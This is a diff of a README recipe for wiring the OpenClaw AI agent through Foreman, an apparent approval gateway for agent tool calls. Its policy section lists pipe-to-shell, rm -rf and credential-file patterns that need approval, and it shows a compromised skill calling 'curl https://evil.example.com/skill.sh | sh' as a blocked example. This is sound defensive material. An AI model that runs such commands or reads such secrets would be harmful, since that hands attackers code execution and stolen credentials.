@@ -9,7 +9,7 @@ This recipe is intentionally short. OpenClaw speaks MCP, so we hand its tool cal
 ```bash
 # Foreman
 curl -fsSL https://raw.githubusercontent.com/tuzlu07x/foreman/main/install.sh | bash
-foreman init                       # ~/.foreman/ (identity, policy, db)
+foreman init                       # Foreman's home (identity, policy, db)
 foreman secrets add anthropic-key  # stored once, every agent reads it back
 
 # OpenClaw — official installer (curl on macOS / Linux; PowerShell on Windows).
@@ -19,8 +19,9 @@ curl -fsSL https://openclaw.ai/install.sh | bash
 
 Or have Foreman install OpenClaw for you when you select it. Foreman uses `npm install -g openclaw`, which needs the `node` on your PATH to be in OpenClaw's range (`>=24.16.0 <25 || >=26.1.0`). On an older Node, Foreman doesn't run the install: it prints the requirement and the curl command above for you to run yourself, and `foreman doctor` warns until OpenClaw has a Node it can run on.
 
+<!-- pending: #656/#657 -->
 ```bash
-foreman agent add openclaw --type openclaw --auto-install
+foreman agent add openclaw --auto-install
 ```
 
 That command runs the install, injects the MCP snippet into `~/.openclaw/openclaw.json`, and registers OpenClaw with Foreman. The interactive `foreman setup` wizard does the same thing when you check the OpenClaw box. Unchecking later runs `npm uninstall -g openclaw` plus removes the registration.
@@ -29,8 +30,9 @@ That command runs the install, injects the MCP snippet into `~/.openclaw/opencla
 
 If you'd rather wire things by hand, register OpenClaw to get its identity token, then merge the foreman block into OpenClaw's JSON5 config (default path `~/.openclaw/openclaw.json`):
 
+<!-- pending: #656/#657 -->
 ```bash
-foreman agent add openclaw --type openclaw --skip-config --token-out ~/.openclaw-foreman.token
+foreman agent add openclaw --skip-config --token-out ~/.openclaw-foreman.token
 ```
 
 ```jsonc
@@ -55,8 +57,10 @@ OpenClaw validates its config strictly and refuses to start on unknown keys, so 
 
 ## 3. Apply the skill-safe policy
 
+This replaces your `policy.yaml` ([where it lives](../../docs/policy.md#where-the-file-is); the Linux path is shown):
+
 ```bash
-cp examples/openclaw-integration/example-policy.yaml ~/.foreman/policy.yaml
+cp examples/openclaw-integration/example-policy.yaml ~/.config/foreman/policy.yaml
 foreman policy show
 ```
 
@@ -64,7 +68,7 @@ foreman policy show
 
 - `shell_exec` containing `curl … | sh`, `wget … | bash`, `rm -rf`, `chmod 777` → **ask** (the exfiltration tail of CVE-2026-25253)
 - `read_file` / `write_file` on `.env`, `*.key`, `id_rsa`, `id_ed25519`, `~/.ssh/`, `~/.aws/credentials`, `~/.openclaw/skills/*/manifest.toml` → **ask**
-- 60 msg/min, 200K tokens/hour rate limit on OpenClaw
+- a 60 calls/minute rate limit on OpenClaw (the file also sets 200K tokens/hour, which isn't enforced yet)
 
 The comment block in the YAML links each rule to the public CVE / Koi Security advisory it defends against.
 
@@ -84,8 +88,8 @@ openclaw                 # OpenClaw's TUI / gateway
 
 Now drive OpenClaw the way you normally do. Foreman's Activity panel scrolls every MCP tool call live.
 
-- A normal `read_file("README.md")` → `✓ allow · policy:N · Xms`
-- A compromised skill firing `shell_exec("curl https://evil.example.com/skill.sh | sh")` → ⚠ approval modal with the command, risk score, and reasons. Press `[d]` to deny, `[a]` to allow, `[r]` to remember.
+- A normal `read_file("README.md")` → `✓ allowed · policy:N · Xms`
+- A compromised skill firing `shell_exec("curl https://evil.example.com/skill.sh | sh")` → ⚠ approval modal with the command, risk score, and reasons. Press `d` to deny, `a` to allow once, `A` / `D` to allow / deny and remember it for every `shell_exec` from OpenClaw.
 
 ## 5. Audit afterwards
 
